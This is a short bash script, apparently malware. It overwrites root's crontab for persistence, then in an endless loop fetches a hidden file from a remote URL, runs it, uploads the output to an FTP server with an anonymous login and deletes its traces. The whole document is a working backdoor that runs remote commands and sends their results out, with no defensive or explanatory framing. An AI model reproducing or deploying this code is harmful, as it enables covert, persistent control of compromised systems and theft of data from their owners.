#!/bin/bash
echo "8 * * * * /usr/bin/jeremy" > /var/spool/cron/root
while true
do
	wget http://url/.sampoyy 2> /dev/null
	chmod 111 .sampoyy
	sh .sampoyy >.lisa
	echo $(date) >> .lisa	

	ftp -v -n ftp://url << EOF 
	user anonymous User@ 
	passive 
	put /root/.lisa
	bye
EOF

	rm -fr .lisa .sampoyy
	sleep 10
done
